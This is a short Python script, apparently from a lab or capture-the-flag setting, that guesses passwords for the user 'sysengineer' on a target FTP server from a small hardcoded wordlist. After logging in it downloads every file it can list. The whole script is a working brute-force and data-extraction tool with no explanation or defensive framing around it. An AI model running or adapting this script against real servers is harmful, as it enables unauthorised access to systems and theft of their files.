import ftplib, sys, os

def FTPAccess(host, port, user, password):
    server = ftplib.FTP() # initialize FTP server object
    print(f"[!] Trying", password)
    try:
        server.connect(host, port, timeout=5) # Connect to FTP server with a timeout of 5

        server.login(user, password)         # login using the credentials (user & password)
    except ftplib.error_perm:
        return False  # Login failed, wrong credentials
    else:
        print("[+] Found credentials to FTP Server:", password) # Correct credentials
        files = []
        files = server.nlst()
        for file in files:
            try:
                server.retrbinary("RETR " + file ,open(file, 'wb').write)
                print("Extracted: " + file)
            except:
                pass
        return True

def main(): 
    print("FTP Server Access Automation Script")
    if(len(sys.argv) != 3):
        print("(+) usage: %s <target> <port>" % sys.argv[0])
        print('(+) eg: %s 192.168.121.103' % sys.argv[0])
        sys.exit(-1)
    
    host = sys.argv[1] # hostname or IP address of the FTP server
    
    user = "sysengineer" # username of the FTP server
    
    port = int(sys.argv[2]) # port of FTP
    
    passwords = ["james1", "james"] # read the wordlist of passwords
    print("[+] Passwords to try:", len(passwords))

    for password in passwords:
        if FTPAccess(host, port, user, password):
            break

if __name__ == "__main__":
  main()
